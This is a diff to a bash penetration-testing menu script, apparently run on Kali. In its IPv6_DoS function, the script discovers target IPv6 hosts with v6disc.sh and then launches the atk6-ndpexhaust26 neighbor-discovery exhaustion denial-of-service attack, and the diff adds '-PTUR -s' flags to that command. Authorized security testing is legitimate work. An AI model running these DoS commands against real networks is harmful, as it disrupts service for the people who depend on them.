@@ -333,7 +333,7 @@ function IPv6_DoS {
                 echo 'tool name "v6disc" path "/home/kali/Desktop/tools/OnwardTools/third-party-tools/v6disc/v6disc.sh"'
                 echo 'SOP: 1. use v6disc.sh discovery target IPv6'
                 echo '     2. use atk6-ndpexhaust26 DoS target'
-                echo 'command is "v6disc.sh $interface" & "atk6-ndpexhaust26 $tester_ipv6 $interface $target_ipv6"'
+                echo 'command is "v6disc.sh $interface" & "atk6-ndpexhaust26 -PTUR -s $tester_ipv6 $interface $target_ipv6"'
                 echo '--------------------------------------'
                 printf 'run v6disc to discovery target IPv6 (Y/n)? '
                 read answer
@@ -348,7 +348,7 @@ function IPv6_DoS {
                     if [ "$answer" != "${answer#[Yy]}" ] || [ "$answer" == '' ] ;then
                         printf 'target_ipv6: '
                         read target_ipv6
-                        atk6-ndpexhaust26 $tester_ipv6 $interface $target_ipv6
+                        atk6-ndpexhaust26 -PTUR -s $tester_ipv6 $interface $target_ipv6
                     else
                         echo Done
                     fi
@@ -362,7 +362,7 @@ function IPv6_DoS {
                         read interface
                         printf 'target_ipv6: '
                         read target_ipv6
-                        atk6-ndpexhaust26 $tester_ipv6 $interface $target_ipv6
+                        atk6-ndpexhaust26 -PTUR -s $tester_ipv6 $interface $target_ipv6
                     fi
                     echo Done
                 fi;;
